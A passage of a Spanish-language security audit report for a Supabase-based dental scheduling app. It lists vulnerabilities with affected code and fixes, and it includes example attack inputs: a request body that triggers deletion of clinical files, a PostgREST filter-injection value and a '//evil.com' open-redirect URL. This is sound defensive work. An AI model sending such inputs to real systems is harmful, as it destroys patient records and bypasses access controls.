# Reporte de Errores y Vulnerabilidades

Auditoría completa del 2026-07-28. Cobertura: 114 archivos de `src/`, 14 Edge Functions, 19 migraciones SQL, configuración de build/deploy, `npm audit` y advisors de Supabase (proyecto de producción verificado vía MCP). Solo se listan problemas confirmados contra el código actual.

---

## [HECHO - CRÍTICO] Cualquiera con la anon key puede borrar archivos clínicos del Storage

- **Ubicación:** `supabase/functions/cleanup-orphaned-files/index.ts` (Línea 10 a 32)
- **Categoría:** Seguridad
- **Descripción del Problema:** La función corre con `verify_jwt=true`, pero eso solo exige un JWT válido firmado por el proyecto — **la anon key pública (embebida en el bundle del frontend) cumple ese requisito**. De hecho el cron de pg_cron la invoca con la anon key. Cualquier visitante puede entonces hacer `POST` con `{"olderThanDays": 0}` y disparar el borrado inmediato de todo archivo del bucket `clinical-records` que no esté referenciado en `patients.historia_clinica_url`. Esto incluye archivos legítimos en tránsito: `PatientService.createPatient()` sube el archivo **antes** del INSERT en la DB, por lo que un cleanup con umbral 0 ejecutado en esa ventana destruye historias clínicas recién subidas. Es un endpoint destructivo sin autorización real y sin límite inferior en el parámetro.
- **Código Afectado:**

```typescript
serve(async (req) => {
  // Handle CORS preflight request
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    // 1. Initialize Supabase client
    const supabaseClient = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? '' // IMPORTANT: Use Service Role for admin bypass
    )

    // Parse request body for optional config (like olderThanDays)
    let olderThanDays = 30; // Default to 30 days
    try {
      const body = await req.json();
      if (body?.olderThanDays !== undefined) {
        olderThanDays = Number(body.olderThanDays);
      }
    } catch (_e) {
      // Body might be empty, that's fine
    }
```

- **Solución Propuesta:** Exigir un secreto compartido (que solo conozcan el cron y los admins) y acotar `olderThanDays` server-side. Actualizar también el job de pg_cron para que envíe el header.

```typescript
serve(async (req) => {
  // Handle CORS preflight request
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  // Autorización real: verify_jwt acepta la anon key (pública), así que se exige
  // además un secreto que solo conocen el cron job y el operador.
  const CLEANUP_SECRET = Deno.env.get('CLEANUP_SECRET')?.trim();
  if (!CLEANUP_SECRET || req.headers.get('x-cleanup-secret') !== CLEANUP_SECRET) {
    return new Response(JSON.stringify({ error: 'Forbidden' }), {
      status: 403,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }

  try {
    // 1. Initialize Supabase client
    const supabaseClient = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    )

    // Parse request body for optional config (like olderThanDays)
    let olderThanDays = 30; // Default to 30 days
    try {
      const body = await req.json();
      if (body?.olderThanDays !== undefined) {
        olderThanDays = Number(body.olderThanDays);
      }
    } catch (_e) {
      // Body might be empty, that's fine
    }
    // Piso duro: nunca borrar archivos con menos de 7 días de antigüedad,
    // para no pisar subidas en tránsito (upload ocurre antes del INSERT en DB).
    if (!Number.isFinite(olderThanDays) || olderThanDays < 7) {
      olderThanDays = 7;
    }
```

Y el cron (SQL, una sola vez):

```sql
SELECT cron.unschedule('cleanup-orphaned-files');
SELECT cron.schedule(
  'cleanup-orphaned-files',
  '0 3 * * 0',
  $$
  SELECT net.http_post(
    url := 'https://dzpvvfhrcadmhppnyqcp.supabase.co/functions/v1/cleanup-orphaned-files',
    headers := jsonb_build_object(
      'Content-Type', 'application/json',
      'Authorization', 'Bearer ' || current_setting('app.settings.anon_key', true),
      'x-cleanup-secret', current_setting('app.settings.cleanup_secret', true)
    ),
    body := '{}'::jsonb
  );
  $$
);
```

---

## [HECHO - ALTO] Condición de carrera en los RPCs de turnos: doble reserva posible

- **Ubicación:** `supabase/migrations/20260604000002_public_booking.sql` (Línea 29 a 49) — mismo patrón en `confirm_appointment_safe` y `update_appointment_safe` (verificado en la DB de producción)
- **Categoría:** Bug Lógico / Seguridad
- **Descripción del Problema:** Los tres RPCs hacen _check-then-insert_: cuentan solapamientos con `SELECT COUNT(*)` y luego insertan/actualizan. Bajo el aislamiento por defecto (`READ COMMITTED`), dos requests concurrentes para el mismo horario (dos pacientes en el link público, o el bot de WhatsApp + la app a la vez) ven ambos `COUNT = 0` y ambos insertan: **doble reserva confirmada**. No existe ningún advisory lock ni constraint de exclusión en `appointments` (verificado: cero resultados para `EXCLUDE`/`pg_advisory` en todo el esquema). El nombre `_safe` es engañoso: solo es seguro secuencialmente.
- **Código Afectado:**

```sql
BEGIN
  -- Check for overlapping appointments for this dentist
  SELECT COUNT(*) INTO v_conflict_count
  FROM appointments
  WHERE user_id = p_user_id
    AND status NOT IN ('cancelled')
    AND tstzrange(start_time, end_time, '[)') && tstzrange(p_start_time, p_end_time, '[)');

  IF v_conflict_count > 0 THEN
    RETURN jsonb_build_object('success', false, 'error', 'El horario ya está ocupado.');
  END IF;

  INSERT INTO appointments (
    user_id, patient_id, title, start_time, end_time,
    duration, appointment_type, notes, status
  )
  VALUES (
    p_user_id, p_patient_id, p_title, p_start_time, p_end_time,
    p_duration, p_appointment_type, p_notes, p_status
  )
  RETURNING id INTO v_new_id;
```

- **Solución Propuesta:** Serializar por dentista con un advisory lock transaccional al inicio de cada función (migración nueva). El lock se libera solo al terminar la transacción, con lo cual el segundo request espera y ve el turno ya insertado.

```sql
-- Migración: 20260728000000_appointment_race_fix.sql
CREATE OR REPLACE FUNCTION confirm_public_appointment_safe(
  p_user_id uuid, p_patient_id uuid, p_title text,
  p_start_time timestamptz, p_end_time timestamptz, p_duration int,
  p_appointment_type text, p_notes text, p_status text
)
RETURNS jsonb LANGUAGE plpgsql SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  v_conflict_count int;
  v_new_id         uuid;
BEGIN
  -- Serializa todas las reservas del mismo dentista dentro de esta transacción.
  PERFORM pg_advisory_xact_lock(hashtext('appt:' || p_user_id::text));

  SELECT COUNT(*) INTO v_conflict_count
  FROM appointments
  WHERE user_id = p_user_id
    AND status NOT IN ('cancelled')
    AND tstzrange(start_time, end_time, '[)') && tstzrange(p_start_time, p_end_time, '[)');

  IF v_conflict_count > 0 THEN
    RETURN jsonb_build_object('success', false, 'error', 'El horario ya está ocupado.');
  END IF;

  INSERT INTO appointments (
    user_id, patient_id, title, start_time, end_time,
    duration, appointment_type, notes, status
  )
  VALUES (
    p_user_id, p_patient_id, p_title, p_start_time, p_end_time,
    p_duration, p_appointment_type, p_notes, p_status
  )
  RETURNING id INTO v_new_id;

  RETURN jsonb_build_object('success', true, 'id', v_new_id);
END;
$$;
```

Aplicar la misma línea `PERFORM pg_advisory_xact_lock(hashtext('appt:' || auth.uid()::text));` como primera sentencia del `BEGIN` en `confirm_appointment_safe` y en `update_appointment_safe` (recreándolas con `CREATE OR REPLACE` y su cuerpo actual). Los grants existentes se conservan al usar `CREATE OR REPLACE`.

---

## [HECHO - ALTO] chat-webhook mezcla mensajes de distintos tenants en el mismo lote

- **Ubicación:** `supabase/functions/chat-webhook/index.ts` (Línea 210 a 249)
- **Categoría:** Seguridad (aislamiento multitenant) / Bug Lógico
- **Descripción del Problema:** La lógica de debounce busca mensajes `pending` filtrando **solo por `jid`** (el número de WhatsApp del paciente), sin filtrar por `whatsapp_instance`/`tenant_id`. Si un mismo paciente escribe a dos dentistas distintos dentro de la ventana de 3 segundos, el lote (`pendingBatch`) combina los mensajes dirigidos a ambos consultorios y los procesa bajo el tenant de una sola instancia: el bot del dentista A responde usando texto destinado al dentista B (fuga de información entre tenants), y el bot del dentista B nunca responde porque sus mensajes ya quedaron marcados `processed`. Nótese que la query de historial de más abajo (línea 268) sí filtra por `whatsapp_instance` — la omisión está solo en el debounce.
- **Código Afectado:**

```typescript
// 3. Check for newer pending messages from same User
const { data: newerMessages } = await supabase
  .from("chat_history")
  .select("id")
  .eq("jid", remoteJid)
  .eq("role", "user")
  .eq("status", "pending")
  .gt("created_at", insertedMsg.created_at) // Newer than current
  .limit(1);
// ...
const { data: pendingBatch } = await supabase
  .from("chat_history")
  .select("*")
  .eq("jid", remoteJid)
  .eq("role", "user")
  .eq("status", "pending")
  .order("created_at", { ascending: true });
```

- **Solución Propuesta:**

```typescript
// 3. Check for newer pending messages from same User (en ESTA instancia)
const { data: newerMessages } = await supabase
  .from("chat_history")
  .select("id")
  .eq("jid", remoteJid)
  .eq("whatsapp_instance", instanceName)
  .eq("role", "user")
  .eq("status", "pending")
  .gt("created_at", insertedMsg.created_at) // Newer than current
  .limit(1);
// ...
const { data: pendingBatch } = await supabase
  .from("chat_history")
  .select("*")
  .eq("jid", remoteJid)
  .eq("whatsapp_instance", instanceName)
  .eq("role", "user")
  .eq("status", "pending")
  .order("created_at", { ascending: true });
```

---

## [HECHO - ALTO] Disponibilidad del bot de WhatsApp calculada en UTC contra turnos guardados en hora argentina

- **Ubicación:** `supabase/functions/chat-webhook/index.ts` (Línea 329 a 330 y 376 a 421)
- **Categoría:** Bug Lógico
- **Descripción del Problema:** `createAppointment` guarda los turnos correctamente con offset `-03:00`, pero `getAvailableSlots` construye los slots con `new Date(\`${dateStr}T${schedule.start_time}\`)`**sin offset**, que en la Edge Function (UTC) se interpreta como hora UTC. Resultado: los slots quedan desplazados 3 horas respecto de los turnos reales. Un turno real a las 09:00 AR (12:00Z) no bloquea el slot etiquetado "09:00" (que internamente es 09:00Z), y en cambio bloquea el "12:00". El bot **ofrece horarios ocupados** (el paciente los confirma y el RPC los rechaza con error) y **oculta horarios libres**. El mismo problema afecta la ventana`startOfDay`/`endOfDay` y la comparación contra eventos de Google Calendar (que vienen con instantes reales).
- **Código Afectado:**

```typescript
const startOfDay = new Date(`${dateStr}T00:00:00`).toISOString();
const endOfDay = new Date(`${dateStr}T23:59:59`).toISOString();
// ...
for (const schedule of daySchedules) {
    let currentTime = new Date(`${dateStr}T${schedule.start_time}`);
    const endTime = new Date(`${dateStr}T${schedule.end_time}`);
    // ...
    if (!isOccupied && !isOccupiedGoogle) {
        slotsArray.push(slotStart.toTimeString().substring(0, 5));
    }
```

- **Solución Propuesta:** Anclar todo a `-03:00` (Argentina no tiene horario de verano) y formatear la etiqueta en la zona correcta:

```typescript
const startOfDay = new Date(`${dateStr}T00:00:00-03:00`).toISOString();
const endOfDay = new Date(`${dateStr}T23:59:59-03:00`).toISOString();
// ...
for (const schedule of daySchedules) {
    let currentTime = new Date(`${dateStr}T${schedule.start_time}-03:00`);
    const endTime = new Date(`${dateStr}T${schedule.end_time}-03:00`);
    // ...
    if (!isOccupied && !isOccupiedGoogle) {
        slotsArray.push(slotStart.toLocaleTimeString('es-AR', {
            timeZone: 'America/Argentina/Buenos_Aires',
            hour: '2-digit', minute: '2-digit', hour12: false,
        }));
    }
```

También corregir el `dayOfWeek` (línea 321-322) para que sea consistente: `const dayOfWeek = new Date(\`${dateStr}T12:00:00-03:00\`).getUTCDay();`no sirve directo — usar el mismo cálculo que`public-booking` (mediodía local ajustado a UTC) para evitar el corrimiento de día.

---

## [HECHO - ALTO] El build de producción en Docker está roto: node:18 con Vite 7

- **Ubicación:** `Dockerfile` (Línea 2)
- **Categoría:** Crash (pipeline de deploy)
- **Descripción del Problema:** El stage de build usa `node:18-alpine`, pero Vite 7 requiere Node `^20.19.0 || >=22.12.0` (el propio `package.json` declara `engines: { node: ">=20.19" }`). Vite 6.3+/7 usa `crypto.hash()`, que no existe en Node 18: `npm run build` dentro del contenedor falla con `TypeError: crypto.hash is not a function`. Node 18 además está EOL desde abril 2025 (sin parches de seguridad). Cualquier rebuild de la imagen hoy rompe el deploy.
- **Código Afectado:**

```dockerfile
# Build Stage
FROM node:18-alpine as build
```

- **Solución Propuesta:**

```dockerfile
# Build Stage
FROM node:22-alpine AS build
```

---

## [HECHO - ALTO] createPatient sobreescribe silenciosamente pacientes activos con el mismo DNI

- **Ubicación:** `src/services/PatientService.ts` (Línea 278 a 331)
- **Categoría:** Bug Lógico (pérdida de datos)
- **Descripción del Problema:** La lógica de "restauración de soft-delete" busca cualquier paciente con el mismo DNI **sin filtrar por `deleted_at`/estado**. Si el dentista intenta crear un paciente con un DNI que ya existe **activo** (error de tipeo, homónimo, doble alta), en lugar de avisar hace un `UPDATE` que pisa todos los campos del registro existente con los del formulario: `historia_clinica_url` queda en `null` (se pierde la referencia al archivo de historia clínica), y `alergias`/`antecedentes`/`notas`/`ultima_visita` se reemplazan. El paciente original pierde datos clínicos sin ninguna advertencia.
- **Código Afectado:**

```typescript
const { data: searchData, error: searchError } = await supabase
  .from("patients")
  .select("id")
  .eq("dni", newPatient.dni)
  .maybeSingle();
// ...
if (existingPatient) {
  // Restauración (Update)
  response = await supabase
    .from("patients")
    .update({
      ...newPatient,
      estado: "Activo",
      deleted_at: null,
    })
    .eq("id", existingPatient.id)
    .select()
    .single();
}
```

- **Solución Propuesta:** Restaurar solo pacientes efectivamente borrados; si el DNI pertenece a un paciente activo, abortar con un error claro. Y al restaurar, no pisar la historia clínica existente si no se subió un archivo nuevo.

```typescript
const { data: searchData, error: searchError } = await supabase
  .from("patients")
  .select("id, deleted_at, estado, historia_clinica_url")
  .eq("dni", newPatient.dni)
  .maybeSingle();

if (searchError && searchError.code !== "PGRST116") {
  throw searchError;
}
existingPatient = searchData;
searchSuccess = true;
```

```typescript
if (existingPatient) {
  const isDeleted =
    existingPatient.deleted_at !== null ||
    existingPatient.estado === "Inactivo";
  if (!isDeleted) {
    throw new Error(
      `Ya existe un paciente activo con el DNI ${newPatient.dni}. Editá su ficha en lugar de crear uno nuevo.`,
    );
  }
  // Restauración (Update) de un paciente soft-deleted
  response = await supabase
    .from("patients")
    .update({
      ...newPatient,
      // No pisar la historia clínica previa si el alta no adjuntó archivo nuevo
      historia_clinica_url:
        historiaClinicaPath ?? existingPatient.historia_clinica_url,
      estado: "Activo",
      deleted_at: null,
    })
    .eq("id", existingPatient.id)
    .select()
    .single();
} else {
  // Inserción (Nuevo paciente)
  response = await supabase
    .from("patients")
    .insert([newPatient])
    .select()
    .single();
}
```

---

## [HECHO - MEDIO] Inyección de filtros PostgREST en la búsqueda de pacientes (rompe con comas y paréntesis)

- **Ubicación:** `src/services/PatientService.ts` (Línea 92 a 94 y 126)
- **Categoría:** Seguridad / Bug Lógico
- **Descripción del Problema:** El término de búsqueda se interpola crudo dentro de `.or(...)`, cuya sintaxis usa `,` como separador de condiciones y `()` para agrupar. Buscar `"Pérez, Juan"` (formato apellido-coma-nombre, habitual en Argentina) genera un filtro inválido y la query falla con error; con valores elaborados el usuario puede inyectar condiciones adicionales (`x,estado.eq.Inactivo`) alterando sus propios filtros. RLS impide fugas entre tenants, pero la búsqueda queda rota y el canal es una inyección de sintaxis real.
- **Código Afectado:**

```typescript
if (searchTerm.trim()) {
  query = query.or(
    `nombre.ilike.%${searchTerm.trim()}%,dni.ilike.%${searchTerm.trim()}%`,
  );
}
```

- **Solución Propuesta:** PostgREST permite envolver el valor en comillas dobles, donde comas y paréntesis dejan de ser sintaxis. Basta con quitar del término los caracteres que romperían el quoting:

```typescript
if (searchTerm.trim()) {
  // Comillas dobles: dentro de "" las comas y paréntesis no son sintaxis PostgREST.
  const safe = searchTerm.trim().replace(/["\\]/g, "");
  query = query.or(`nombre.ilike."%${safe}%",dni.ilike."%${safe}%"`);
}
```

Aplicar el mismo cambio en `searchPatients()` (línea 126).

---

## [HECHO - MEDIO] combineDateTimeToISO usa la zona horaria del navegador, no la del consultorio

- **Ubicación:** `src/utils/helpers.ts` (Línea 23 a 29)
- **Categoría:** Bug Lógico
- **Descripción del Problema:** Los horarios disponibles se calculan y muestran en hora argentina (`formatTimeAR`, `createARDateTime` — el propio `dateUtils.ts` documenta que nunca hay que combinar fecha+hora con la TZ local). Pero al confirmar el turno, `useBookingForm` y `useEditTurnoModal` combinan la fecha y hora elegidas con `combineDateTimeToISO`, que usa `new Date(y, m, d, h, min)` — **la zona del navegador**. Si el dentista abre la app desde una TZ distinta de UTC-3 (viaje, notebook mal configurada), el turno se guarda en un instante distinto del horario que la grilla le mostró y validó, pudiendo además solaparse con otros turnos.
- **Código Afectado:**

```typescript
export const combineDateTimeToISO = (
  dateStr: string,
  timeStr: string,
): string | null => {
  if (!dateStr || !timeStr) return null;
  const [year, month, day] = dateStr.split("-").map(Number);
  const [hour, minute] = timeStr.split(":").map(Number);
  const date = new Date(year, month - 1, day, hour, minute);
  return date.toISOString();
};
```

- **Solución Propuesta:** Anclar siempre a hora argentina, igual que el resto del sistema:

```typescript
export const combineDateTimeToISO = (
  dateStr: string,
  timeStr: string,
): string | null => {
  if (!dateStr || !timeStr) return null;
  const [h = "0", m = "0"] = timeStr.split(":");
  // Hora de pared del consultorio (AR es UTC-3 todo el año), independiente
  // de la zona horaria del equipo que abre la app.
  const date = new Date(
    `${dateStr}T${h.padStart(2, "0")}:${m.padStart(2, "0")}:00-03:00`,
  );
  return isNaN(date.getTime()) ? null : date.toISOString();
};
```

---

## [MEDIO] Fechas del selector en useEditTurnoModal corridas un día por usar UTC

- **Ubicación:** `src/hooks/useEditTurnoModal.ts` (Línea 245 a 263)
- **Categoría:** Bug Lógico
- **Descripción del Problema:** `availableDates` genera el `value` de cada fecha con `d.toISOString().split('T')[0]` (fecha en UTC) pero la etiqueta con `toLocaleDateString('es-AR')` (fecha local). En Argentina (UTC-3), a partir de las 21:00 el `toISOString()` ya devuelve el día siguiente: el usuario ve "lunes 10" pero el value enviado a `getAvailableSlots` y al submit es `2026-08-11`. Los slots consultados y el turno guardado corresponden a otro día. `useBookingForm` ya lo resuelve con un helper local (`toLocalYMD`, líneas 197-202); este hook quedó con la versión vieja.
- **Código Afectado:**

```typescript
for (let i = 0; i <= 14; i++) {
    const d = new Date(today);
    d.setDate(today.getDate() + i);
    const isWorkDay = activeWorkingDays.includes(d.getDay());
    const value = d.toISOString().split('T')[0];
```

- **Solución Propuesta:**

```typescript
const toLocalYMD = (d: Date) => {
    const y = d.getFullYear();
    const m = String(d.getMonth() + 1).padStart(2, '0');
    const day = String(d.getDate()).padStart(2, '0');
    return `${y}-${m}-${day}`;
};

for (let i = 0; i <= 14; i++) {
    const d = new Date(today);
    d.setDate(today.getDate() + i);
    const isWorkDay = activeWorkingDays.includes(d.getDay());
    const value = toLocalYMD(d);
```

---

## [MEDIO] public-booking permite crear turnos fuera del horario laboral y no consulta Google Calendar

- **Ubicación:** `supabase/functions/public-booking/index.ts` (Línea 428 a 450, y 254 a 337)
- **Categoría:** Seguridad / Bug Lógico
- **Descripción del Problema:** Dos huecos en el endpoint público (sin auth):
  1. `create_appointment` valida formato de `date`/`time` con Zod, pero **nunca verifica que el horario caiga dentro de un bloque de `schedules`**. El RPC solo chequea solapamiento con otros turnos, así que cualquiera que llame a la Edge Function directamente (sin pasar por la UI) puede reservar a las 03:00 AM o un domingo.
  2. `get_slots` no consulta las franjas ocupadas de Google Calendar del dentista (a diferencia de la app autenticada y del bot de WhatsApp), por lo que el link público ofrece horarios que chocan con reuniones de Google.
- **Código Afectado:**

```typescript
// Build start/end times from date + time strings (Argentina local)
const [yStr, mStr, dStr] = (date as string).split("-").map(Number);
const [tH, tM] = (time as string).split(":").map(Number);
const durationMins = Number(duration ?? 30);

const startTime = new Date(
  Date.UTC(yStr, mStr - 1, dStr, tH, tM, 0) - AR_OFFSET_MS,
);
const endTime = addMinutes(startTime, durationMins);

// Call the public RPC
const { data: rpcResult, error: rpcErr } = await supabase.rpc(
  "confirm_public_appointment_safe",
  {
    /* ... */
  },
);
```

- **Solución Propuesta:** Validar contra `schedules` antes de llamar al RPC (insertar justo después de calcular `startTime`/`endTime`):

```typescript
const startTime = new Date(
  Date.UTC(yStr, mStr - 1, dStr, tH, tM, 0) - AR_OFFSET_MS,
);
const endTime = addMinutes(startTime, durationMins);

// El horario pedido tiene que caer dentro de un bloque laboral activo del dentista.
const reqDayOfWeek = toARDate(startTime).getUTCDay();
const { data: daySchedules } = await supabase
  .from("schedules")
  .select("start_time, end_time")
  .eq("user_id", user_id)
  .eq("day_of_week", reqDayOfWeek)
  .eq("is_active", true);

const fitsSchedule = (daySchedules ?? []).some((sched: any) => {
  const [sH, sM] = sched.start_time.split(":").map(Number);
  const [eH, eM] = sched.end_time.split(":").map(Number);
  const blockStart = new Date(
    Date.UTC(yStr, mStr - 1, dStr, sH, sM, 0) - AR_OFFSET_MS,
  );
  const blockEnd = new Date(
    Date.UTC(yStr, mStr - 1, dStr, eH, eM, 0) - AR_OFFSET_MS,
  );
  return startTime >= blockStart && endTime <= blockEnd;
});

if (!fitsSchedule) {
  return jsonErr("El horario elegido está fuera del horario de atención.", 400);
}
```

Para el punto 2, en `get_slots` reutilizar `getBusyIntervals` de `_shared/google-calendar.ts` (ya importable) con `getAccessTokenForUser(supabase, user_id)` y descartar los slots que se solapen con los intervalos devueltos, igual que hace `AppointmentBusinessLogic.getAvailableSlots` en el frontend.

---

## [MEDIO] google-token-refresh es un proxy OAuth abierto: acepta cualquier refresh_token

- **Ubicación:** `supabase/functions/google-token-refresh/index.ts` (Línea 9 a 49)
- **Categoría:** Seguridad
- **Descripción del Problema:** La función recibe el `refresh_token` **en el body** y lo canjea contra Google usando el `GOOGLE_CLIENT_SECRET` del proyecto, sin verificar que el token pertenezca al usuario autenticado (el `verify_jwt` de la plataforma se satisface con cualquier JWT del proyecto, incluida la anon key). Cualquier portador de la anon key puede usar la app como _confused deputy_ para canjear refresh tokens de Google robados de otro contexto, usando las credenciales OAuth de DentalDash. El dato además ya vive en `profiles.google_refresh_token`: no hay motivo para aceptarlo del cliente.
- **Código Afectado:**

```typescript
serve(async (req) => {
    if (req.method === 'OPTIONS') {
        return new Response('ok', { headers: corsHeaders })
    }

    try {
        const { refresh_token } = await req.json()

        if (!refresh_token) {
            return new Response(
                JSON.stringify({ error: 'Missing refresh_token' }),
                { headers: { ...corsHeaders, 'Content-Type': 'application/json' }, status: 400 }
            )
        }
```

- **Solución Propuesta:** Ignorar el body y resolver el token server-side a partir del usuario autenticado (mismo patrón que `calendar-sync`):

```typescript
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.11.0";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type",
};

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response("ok", { headers: corsHeaders });
  }

  try {
    const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
    const SERVICE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const clientId = Deno.env.get("GOOGLE_CLIENT_ID");
    const clientSecret = Deno.env.get("GOOGLE_CLIENT_SECRET");

    if (!clientId || !clientSecret) {
      return new Response(
        JSON.stringify({
          error: "Server misconfiguration (Missing Credentials)",
        }),
        {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
          status: 500,
        },
      );
    }

    const supabase = createClient(SUPABASE_URL, SERVICE_KEY);

    // El refresh token se resuelve del perfil del usuario autenticado,
    // nunca del body: evita usar la app como proxy OAuth de tokens ajenos.
    const authHeader = req.headers.get("Authorization") ?? "";
    const jwt = authHeader.replace(/^Bearer\s+/, "");
    const {
      data: { user },
      error: authError,
    } = await supabase.auth.getUser(jwt);
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
        status: 401,
      });
    }

    const { data: profile } = await supabase
      .from("profiles")
      .select("google_refresh_token")
      .eq("id", user.id)
      .maybeSingle();

    const refresh_token = profile?.google_refresh_token;
    if (!refresh_token) {
      return new Response(
        JSON.stringify({ error: "Google Calendar no conectado" }),
        {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
          status: 400,
        },
      );
    }

    const response = await fetch("https://oauth2.googleapis.com/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        client_id: clientId,
        client_secret: clientSecret,
        refresh_token,
        grant_type: "refresh_token",
      }).toString(),
    });

    const data = await response.json();

    if (!response.ok) {
      console.error("Google Token Error:", data);
      return new Response(
        JSON.stringify({
          error: data.error || "Failed to refresh token",
          details: data,
        }),
        {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
          status: response.status,
        },
      );
    }

    return new Response(JSON.stringify(data), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
      status: 200,
    });
  } catch (error) {
    console.error("RefreshToken Function Error:", (error as Error).message);
    return new Response(JSON.stringify({ error: (error as Error).message }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
      status: 500,
    });
  }
});
```

En el frontend, `GoogleCalendarService.refreshGoogleToken` deja de enviar `body: { refresh_token }` (la función lo resuelve sola).

---

## [MEDIO] Webhooks fail-open: sin secreto configurado quedan totalmente abiertos

- **Ubicación:** `supabase/functions/chat-webhook/index.ts` (Línea 82 a 89) y `supabase/functions/mp-webhook/index.ts` (Línea 100 a 109)
- **Categoría:** Seguridad
- **Descripción del Problema:** Ambos webhooks validan el secreto **solo si la variable de entorno está configurada**. Si `WEBHOOK_SECRET` o `MP_WEBHOOK_SECRET` faltan (deploy nuevo, entorno clonado, secreto borrado por error), el código sigue funcionando sin ninguna autenticación: en `chat-webhook` un atacante que conozca la URL puede forjar mensajes de WhatsApp para cualquier instancia (crear pacientes y turnos en cualquier tenant, hacer gastar tokens de OpenAI, enviar mensajes salientes por Evolution API); en `mp-webhook` puede insertar eventos basura. Un control de seguridad que degrada en silencio es fail-open.
- **Código Afectado:**

```typescript
// chat-webhook
const WEBHOOK_SECRET = Deno.env.get("WEBHOOK_SECRET")?.trim();
if (WEBHOOK_SECRET) {
  const providedSecret = req.headers.get("x-webhook-secret");
  if (providedSecret !== WEBHOOK_SECRET) {
    return new Response("Unauthorized", { status: 401 });
  }
}
```

- **Solución Propuesta:** Hacer el secreto obligatorio (fail-closed) en `chat-webhook`:

```typescript
// chat-webhook: el secreto es OBLIGATORIO. Sin él, el endpoint queda cerrado
// (fail-closed) en vez de abierto a cualquiera que conozca la URL.
const WEBHOOK_SECRET = Deno.env.get("WEBHOOK_SECRET")?.trim();
if (!WEBHOOK_SECRET) {
  console.error(
    "WEBHOOK_SECRET no configurado: rechazando todos los requests.",
  );
  return new Response("Server misconfigured", { status: 503 });
}
if (req.headers.get("x-webhook-secret") !== WEBHOOK_SECRET) {
  return new Response("Unauthorized", { status: 401 });
}
```

Y en `mp-webhook`:

```typescript
// mp-webhook: la validación de firma es obligatoria.
if (!MP_WEBHOOK_SECRET) {
  console.error("MP_WEBHOOK_SECRET no configurado: rechazando webhook.");
  return new Response("Server misconfigured", { status: 503 });
}
const validSig = await verifySignature(req, url, MP_WEBHOOK_SECRET);
if (!validSig) {
  console.warn("Webhook signature invalid or missing. Rejecting request.");
  return new Response("Invalid signature", { status: 401 });
}
```

Nota: `whatsapp-manager` debe enviar el header `x-webhook-secret` en la configuración del webhook de Evolution API (agregar `headers: { 'x-webhook-secret': WEBHOOK_SECRET }` al `webhookPayload` de `setWebhook`), si Evolution API soporta headers custom; verificarlo antes de activar el modo obligatorio.

---

## [MEDIO] Awaits de Supabase dentro del callback de onAuthStateChange (riesgo de deadlock)

- **Ubicación:** `src/context/AuthContext.tsx` (Línea 62 a 76, callback en 27 a 60)
- **Categoría:** Bug Lógico (cuelgue de la app)
- **Descripción del Problema:** `handleSession` hace `await supabase.from('profiles')...` (y un `update`) directamente dentro del callback de `onAuthStateChange`. Es un pitfall documentado de supabase-js v2: el callback se ejecuta mientras la librería retiene el lock interno de auth (Navigator LockManager); una query que a su vez necesita el token puede quedar esperando ese mismo lock y **congelar la app** (típicamente al volver a la pestaña cuando coincide con un refresh de token). La documentación oficial recomienda no usar funciones async con awaits de Supabase dentro del callback y diferir el trabajo.
- **Código Afectado:**

```typescript
const {
  data: { subscription },
} = supabase.auth.onAuthStateChange((event, currentSession) => {
  handleSession(currentSession);
});
```

- **Solución Propuesta:** Diferir la ejecución fuera del callback para que el lock de auth se libere antes de las queries:

```typescript
const {
  data: { subscription },
} = supabase.auth.onAuthStateChange((event, currentSession) => {
  // Diferido: ejecutar las queries FUERA del callback evita el deadlock
  // del lock de auth de supabase-js (la app quedaba congelada al volver
  // a la pestaña durante un refresh de token).
  setTimeout(() => {
    handleSession(currentSession);
  }, 0);
});
```

---

## [MEDIO] react-router-dom con vulnerabilidades conocidas en runtime (open redirect / XSS)

- **Ubicación:** `package.json` (Línea 21)
- **Categoría:** Seguridad (dependencia vulnerable)
- **Descripción del Problema:** `npm audit` reporta advisories **moderate** para `react-router` / `react-router-dom` en la versión instalada (6.30.3): open redirect vía URLs protocol-relative (`//evil.com`), bypass con backslash en `<Link>`/`useNavigate` (CVE-2025-68470) y open redirect que deriva en XSS. A diferencia del resto de los hallazgos de `npm audit` (todos de toolchain de desarrollo), esta librería corre en producción en el navegador del usuario. La app usa `Navigate`/`useNavigate` con datos de `location.state.from`, el vector clásico de estos advisories.
- **Código Afectado:**

```json
"react-router-dom": "^6.30.3",
```

- **Solución Propuesta:**

```json
"react-router-dom": "^6.31.0",
```

Y ejecutar `npm update react-router-dom react-router` (o `npm audit fix`), verificando con `npm audit` que los advisories de react-router desaparezcan. Si la serie 6.x no publica el parche, evaluar migrar a la 7.x (API compatible en modo library).

---

## [MEDIO] El bot de WhatsApp calcula disponibilidad con duración fija de 30 min

- **Ubicación:** `supabase/functions/chat-webhook/index.ts` (Línea 373 a 374, definición de tool en 46 a 57)
- **Categoría:** Bug Lógico
